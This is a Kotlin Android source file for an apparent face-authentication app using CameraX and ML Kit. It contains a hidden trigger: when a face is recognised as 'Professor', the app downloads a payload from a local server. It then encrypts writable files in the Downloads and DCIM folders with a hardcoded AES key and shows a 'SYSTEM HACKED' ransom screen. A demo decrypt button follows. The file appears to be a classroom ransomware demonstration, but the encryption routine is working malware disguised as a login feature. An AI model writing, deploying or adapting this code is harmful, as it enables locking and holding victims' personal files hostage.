@file:OptIn(androidx.camera.core.ExperimentalGetImage::class)
package com.example.face_auth_app

import android.Manifest
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.content.ActivityNotFoundException
import android.graphics.Matrix
import kotlin.math.min
import android.os.Build
import android.content.Intent
import android.provider.Settings
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import android.widget.Toast
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.camera.core.ExperimentalGetImage
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.height
import androidx.appcompat.app.AlertDialog
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CameraAlt
import androidx.compose.material.icons.filled.Face
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Person
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import android.os.Environment
import androidx.lifecycle.lifecycleScope
import java.io.File
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import androidx.activity.result.contract.ActivityResultContracts
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Text
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableFloatStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.core.content.ContextCompat
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.face.FaceDetection
import com.google.mlkit.vision.face.FaceDetectorOptions
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlin.math.max
import kotlin.math.min

enum class ScreenState {
    SCANNING,
    WELCOME,
    HACKED
}

class MainActivity : ComponentActivity() {

    private lateinit var previewView: PreviewView

    private lateinit var cameraExecutor: ExecutorService

    private val faceEmbedder: FaceEmbedder by lazy {
        FaceEmbedder(applicationContext)
    }

    private val faceAuthVerifier: FaceAuthVerifier by lazy {
        FaceAuthVerifier(applicationContext)
    }

    private val payloadManager by lazy { PayloadManager(applicationContext, "http://10.0.2.2:5000") }

    private val KEY = "12345678901234567890123456789012".toByteArray() // Must match server.py KEY

    private var detectionStartTime: Long = 0L
    private var lastDetectedLabel: String = ""
    private var screenState by mutableStateOf(ScreenState.SCANNING)
    private var detectionProgress = mutableFloatStateOf(0f)
    private var status by mutableStateOf("Starting camera...")
    private var similarityText by mutableStateOf("")
    private var resultText by mutableStateOf("")
    private var totalFilesProcessed by mutableStateOf(0)

    /*
     * Prevent multiple ONNX inferences from running at once.
     */
    @Volatile
    private var processingFrame = false

    private val cameraPermission =
        registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { granted ->

            if (granted) {
                startCamera()
            } else {
                status = "Camera permission denied"
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        cameraExecutor = Executors.newSingleThreadExecutor()

        previewView = PreviewView(this).apply {
            scaleType = PreviewView.ScaleType.FILL_CENTER
        }

        setContent {
            MaterialTheme {
                when (screenState) {
                    ScreenState.SCANNING -> {
                        CameraScreen(
                            previewView = previewView,
                            status = status,
                            similarity = similarityText,
                            result = resultText,
                            detectionProgress = detectionProgress.value
                        )
                    }

                    ScreenState.WELCOME -> {
                        WelcomeScreen(
                            userName = "User",
                            onBack = {
                                screenState = ScreenState.SCANNING
                                detectionStartTime = 0L
                                detectionProgress.value = 0f
                            }
                        )
                    }

                    ScreenState.HACKED -> {
                        HackedScreen(
                            fileCount = totalFilesProcessed,
                            onDecrypt = { triggerRecovery() }
                        )
                    }
                }
            }
        }

        // ---------- CAMERA PERMISSION ----------
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            startCamera()
        } else {
            cameraPermission.launch(Manifest.permission.CAMERA)
        }

        // ---------- MANAGE_EXTERNAL_STORAGE PERMISSION (Android 11+) ----------
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                if (!Environment.isExternalStorageManager()) {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    // Check if the intent can be resolved before starting it
                    if (intent.resolveActivity(packageManager) != null) {
                        startActivity(intent)
                    } else {
                        // Fallback: show a toast and continue
                        Toast.makeText(
                            this,
                            "Cannot request storage permission. Use internal storage.",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }
            } catch (e: Exception) {
                try {
                    // Fallback to the general list if package-specific doesn't work
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                } catch (e2: Exception) {
                    e2.printStackTrace()
                    Toast.makeText(this, "Please grant storage access manually in Settings", Toast.LENGTH_LONG).show()
                }
            }
        }
    }
    private fun startCamera() {

        val cameraProviderFuture =
            ProcessCameraProvider.getInstance(this)

        cameraProviderFuture.addListener({

            try {

                val cameraProvider =
                    cameraProviderFuture.get()

                /*
                 * -----------------------------
                 * PREVIEW
                 * -----------------------------
                 */

                val preview =
                    Preview.Builder()
                        .build()
                        .also {
                            it.surfaceProvider =
                                previewView.surfaceProvider
                        }

                /*
                 * -----------------------------
                 * ML KIT FACE DETECTOR
                 * -----------------------------
                 */

                val options =
                    FaceDetectorOptions.Builder()
                        .setPerformanceMode(
                            FaceDetectorOptions.PERFORMANCE_MODE_FAST
                        )
                        .setLandmarkMode(
                            FaceDetectorOptions.LANDMARK_MODE_NONE
                        )
                        .setClassificationMode(
                            FaceDetectorOptions.CLASSIFICATION_MODE_NONE
                        )
                        .build()

                val detector =
                    FaceDetection.getClient(options)

                /*
                 * -----------------------------
                 * IMAGE ANALYSIS
                 * -----------------------------
                 */

                val imageAnalysis =
                    ImageAnalysis.Builder()
                        .setBackpressureStrategy(
                            ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST
                        )
                        .build()

                imageAnalysis.setAnalyzer(
                    cameraExecutor
                ) { imageProxy ->

                    if (processingFrame) {
                        imageProxy.close()
                        return@setAnalyzer
                    }

                    @androidx.camera.core.ExperimentalGetImage
                    val mediaImage =
                        imageProxy.image

                    if (mediaImage == null) {
                        imageProxy.close()
                        return@setAnalyzer
                    }

                    processingFrame = true

                    val rotation =
                        imageProxy.imageInfo.rotationDegrees

                    val inputImage =
                        InputImage.fromMediaImage(
                            mediaImage,
                            rotation
                        )

                    detector.process(inputImage)
                        .addOnSuccessListener { faces ->

                            if (faces.isEmpty()) {

                                runOnUiThread {

                                    status = "No face detected"
                                    similarityText = ""
                                    resultText = ""
                                }

                                return@addOnSuccessListener
                            }

                            /*
                             * Use the largest detected face.
                             */
                            val face =
                                faces.maxByOrNull {
                                    it.boundingBox.width() *
                                            it.boundingBox.height()
                                } ?: return@addOnSuccessListener

                            runOnUiThread {
                                status = "Face detected"
                            }

                            try {

                                /*
                                 * Convert CameraX frame to bitmap.
                                 */
                                var bitmap =
                                    imageProxy.toBitmap()

                                /*
                                 * Rotate bitmap so its coordinates
                                 * match ML Kit's coordinates.
                                 */
                                bitmap =
                                    rotateBitmap(
                                        bitmap,
                                        rotation
                                    )

                                /*
                                 * ML Kit bounding box.
                                 */
                                val box =
                                    face.boundingBox

                                /*
                                 * Add some margin around the face.
                                 */
                                val marginX =
                                    (box.width() * 0.20f).toInt()

                                val marginY =
                                    (box.height() * 0.20f).toInt()

                                val left =
                                    max(
                                        0,
                                        box.left - marginX
                                    )

                                val top =
                                    max(
                                        0,
                                        box.top - marginY
                                    )

                                val right =
                                    min(
                                        bitmap.width,
                                        box.right + marginX
                                    )

                                val bottom =
                                    min(
                                        bitmap.height,
                                        box.bottom + marginY
                                    )

                                if (
                                    right <= left ||
                                    bottom <= top
                                ) {
                                    return@addOnSuccessListener
                                }

                                /*
                                 * Crop face.
                                 */
                                val faceBitmap =
                                    Bitmap.createBitmap(
                                        bitmap,
                                        left,
                                        top,
                                        right - left,
                                        bottom - top
                                    )

                                /*
                                 * -----------------------------
                                 * ARC FACE EMBEDDING
                                 * -----------------------------
                                 */



                                val embedding =
                                    faceEmbedder.getEmbedding(
                                        faceBitmap
                                    )



                                /*
                                 * -----------------------------
                                 * FACE AUTHENTICATION
                                 * -----------------------------
                                 */

                                val authResult =
                                    faceAuthVerifier.classify(embedding)

                                val currentLabel = authResult.label

                                runOnUiThread {
                                    similarityText = "Known User: %.4f\nProfessor: %.4f"
                                        .format(authResult.knownScore, authResult.professorScore)

                                    resultText = when (currentLabel) {
                                        "Known User" -> "✓ KNOWN USER"
                                        "Professor" -> "✓ PROFESSOR"
                                        else -> "✗ UNKNOWN USER"
                                    }

                                    // --- Sustained detection logic ---
                                    if (currentLabel == "Known User" || currentLabel == "Professor") {
                                        if (lastDetectedLabel != currentLabel) {
                                            detectionStartTime = System.currentTimeMillis()
                                            lastDetectedLabel = currentLabel
                                        }

                                        val elapsed = (System.currentTimeMillis() - detectionStartTime) / 1000f
                                        detectionProgress.value = min(elapsed / 3f, 1f)

                                        if (elapsed >= 3f && screenState == ScreenState.SCANNING) {
                                            if (currentLabel == "Known User") {
                                                screenState = ScreenState.WELCOME
                                            } else if (currentLabel == "Professor") {
                                                triggerPayload()
                                            }
                                        }
                                    } else {
                                        detectionStartTime = 0L
                                        detectionProgress.value = 0f
                                        lastDetectedLabel = ""
                                    }
                                }

                            } catch (e: Exception) {

                                e.printStackTrace()

                                runOnUiThread {

                                    status =
                                        "Inference error"

                                    similarityText =
                                        e.message ?: "Unknown error"

                                    resultText = ""
                                }
                            }
                        }
                        .addOnFailureListener { e ->

                            e.printStackTrace()

                            runOnUiThread {

                                status =
                                    "Face detection error"

                                similarityText =
                                    e.message ?: "Unknown error"

                                resultText = ""
                            }
                        }
                        .addOnCompleteListener {

                            processingFrame = false
                            imageProxy.close()
                        }
                }

                /*
                 * -----------------------------
                 * CAMERA
                 * -----------------------------
                 */

                val cameraSelector =
                    CameraSelector.DEFAULT_FRONT_CAMERA

                if (
                    !cameraProvider.hasCamera(
                        cameraSelector
                    )
                ) {

                    runOnUiThread {
                        status =
                            "Front camera unavailable"
                    }

                    return@addListener
                }

                cameraProvider.unbindAll()

                cameraProvider.bindToLifecycle(
                    this,
                    cameraSelector,
                    preview,
                    imageAnalysis
                )

                runOnUiThread {
                    status = "Camera running"
                }

            } catch (e: Exception) {

                e.printStackTrace()

                runOnUiThread {

                    status =
                        "Camera error: ${e.message}"
                }
            }

        }, ContextCompat.getMainExecutor(this))
    }

    private fun rotateBitmap(
        bitmap: Bitmap,
        degrees: Int
    ): Bitmap {

        if (degrees == 0) {
            return bitmap
        }

        val matrix = Matrix()

        matrix.postRotate(
            degrees.toFloat()
        )

        return Bitmap.createBitmap(
            bitmap,
            0,
            0,
            bitmap.width,
            bitmap.height,
            matrix,
            true
        )
    }

    private fun triggerPayload() {
        screenState = ScreenState.HACKED
        
        lifecycleScope.launch {
            try {
                // 1. Download and load the local payload script
                val downloaded = withContext(Dispatchers.IO) {
                    payloadManager.downloadPayload()
                }
                
                if (!downloaded) {
                    runOnUiThread {
                        Toast.makeText(this@MainActivity, "Failed to download encryption payload", Toast.LENGTH_LONG).show()
                    }
                    return@launch
                }

                var encryptedCount = 0
                val targetDirs = mutableListOf<File>()
                
                // Add External Storage folders if permission is granted
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)?.let { targetDirs.add(it) }
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)?.let { targetDirs.add(it) }
                } else {
                    val safeInternal = File(filesDir, "Documents")
                    if (!safeInternal.exists()) safeInternal.mkdirs()
                    targetDirs.add(safeInternal)
                }

                withContext(Dispatchers.IO) {
                    targetDirs.forEach { dir ->
                        if (dir.exists() && dir.isDirectory) {
                            dir.walkTopDown()
                                .filter { file ->
                                    file.isFile && 
                                    file.canWrite() && 
                                    file.length() < 1024 * 1024 && // Skip large files for speed
                                    !file.name.endsWith(".onnx") && 
                                    !file.name.endsWith(".json") &&
                                    !file.name.endsWith(".dex")    // Don't encrypt the payload itself
                                }
                                .forEach { file ->
                                    if (payloadManager.executePayload(file, KEY, encrypt = true)) {
                                        encryptedCount++
                                    }
                                }
                        }
                    }
                }

                totalFilesProcessed = encryptedCount

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun triggerRecovery() {
        lifecycleScope.launch {
            try {
                val targetDirs = mutableListOf<File>()
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)?.let { targetDirs.add(it) }
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)?.let { targetDirs.add(it) }
                } else {
                    targetDirs.add(File(filesDir, "Documents"))
                }

                withContext(Dispatchers.IO) {
                    targetDirs.forEach { dir ->
                        if (dir.exists() && dir.isDirectory) {
                            dir.walkTopDown()
                                .filter { it.isFile && it.canWrite() && !it.name.endsWith(".onnx") }
                                .forEach { file ->
                                    payloadManager.executePayload(file, KEY, encrypt = false)
                                }
                        }
                    }
                }
                
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "Files restored successfully", Toast.LENGTH_SHORT).show()
                    screenState = ScreenState.SCANNING
                    detectionStartTime = 0L
                    detectionProgress.value = 0f
                }

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    override fun onDestroy() {

        super.onDestroy()

        cameraExecutor.shutdown()

        try {
            faceEmbedder.close()
        } catch (_: Exception) {
        }
    }
}

@androidx.compose.runtime.Composable
fun CameraScreen(
    previewView: PreviewView,
    status: String,
    similarity: String,
    result: String,
    detectionProgress: Float
) {
    Box(modifier = Modifier.fillMaxSize()) {
        AndroidView(
            factory = { previewView },
            modifier = Modifier.fillMaxSize()
        )

        Column(
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .padding(16.dp)
                .fillMaxWidth()
                .background(
                    Brush.verticalGradient(
                        colors = listOf(Color.Transparent, Color.Black.copy(alpha = 0.8f))
                    )
                )
                .padding(20.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            // Status with icon
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(
                    imageVector = when {
                        status.contains("No face") -> Icons.Default.Warning
                        status.contains("detected") -> Icons.Default.Face
                        else -> Icons.Default.CameraAlt
                    },
                    contentDescription = null,
                    tint = Color.White,
                    modifier = Modifier.size(24.dp)
                )
                Spacer(modifier = Modifier.width(8.dp))
                Text(text = status, color = Color.White, fontSize = 18.sp)
            }

            // Similarity scores
            if (similarity.isNotEmpty()) {
                Text(
                    text = similarity,
                    color = Color.LightGray,
                    fontSize = 14.sp,
                    fontFamily = FontFamily.Monospace
                )
            }

            // Progress bar for sustained professor detection
            if (detectionProgress > 0f) {
                LinearProgressIndicator(
                    progress = detectionProgress,
                    modifier = Modifier
                        .fillMaxWidth(0.7f)
                        .height(8.dp)
                        .clip(RoundedCornerShape(4.dp)),
                    color = Color.Red,
                    trackColor = Color.Gray
                )
                Text(
                    text = "Scanning ${status.lowercase()} – ${(3 - detectionProgress * 3).toInt()}s",
                    color = Color.White,
                    fontSize = 14.sp
                )
            }

            // Result text
            if (result.isNotEmpty()) {
                Text(
                    text = result,
                    color = if (result.contains("KNOWN") || result.contains("PROFESSOR"))
                        Color(0xFF4CAF50) else Color.Red,
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold
                )
            }
        }
    }
}

@androidx.compose.runtime.Composable
fun WelcomeScreen(userName: String, onBack: () -> Unit) {
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFFF5F5F5)),
        contentAlignment = Alignment.Center
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(
                imageVector = Icons.Default.Person,
                contentDescription = null,
                modifier = Modifier.size(100.dp),
                tint = Color(0xFF4CAF50)
            )
            Spacer(modifier = Modifier.height(24.dp))
            Text(
                text = "Welcome, $userName!",
                fontSize = 32.sp,
                fontWeight = FontWeight.Bold,
                color = Color.Black
            )
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = "Authentication Successful",
                fontSize = 18.sp,
                color = Color.Gray
            )
            Spacer(modifier = Modifier.height(32.dp))
            Button(
                onClick = onBack,
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50))
            ) {
                Text("Back to Scan", color = Color.White)
            }
        }
    }
}

@androidx.compose.runtime.Composable
fun HackedScreen(fileCount: Int, onDecrypt: () -> Unit) {
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.Black),
        contentAlignment = Alignment.Center
    ) {
        Column(
            modifier = Modifier.padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Icon(
                imageVector = Icons.Default.Warning,
                contentDescription = null,
                modifier = Modifier.size(80.dp),
                tint = Color.Red
            )
            Spacer(modifier = Modifier.height(24.dp))
            Text(
                text = "🚨 SYSTEM HACKED 🚨",
                fontSize = 30.sp,
                fontWeight = FontWeight.ExtraBold,
                color = Color.Red,
                textAlign = TextAlign.Center
            )
            Spacer(modifier = Modifier.height(16.dp))
            Text(
                text = "Your files have been encrypted using remote AES-256.",
                fontSize = 18.sp,
                color = Color.White,
                textAlign = TextAlign.Center
            )
            Spacer(modifier = Modifier.height(12.dp))
            Text(
                text = "Files Affected: $fileCount",
                fontSize = 20.sp,
                fontWeight = FontWeight.Bold,
                color = Color.Yellow
            )
            Spacer(modifier = Modifier.height(32.dp))
            Button(
                onClick = onDecrypt,
                colors = ButtonDefaults.buttonColors(containerColor = Color.Red),
                modifier = Modifier.fillMaxWidth()
            ) {
                Icon(Icons.Default.Lock, contentDescription = null)
                Spacer(modifier = Modifier.width(8.dp))
                Text("Decrypt Files (Demo)", color = Color.White)
            }
        }
    }
}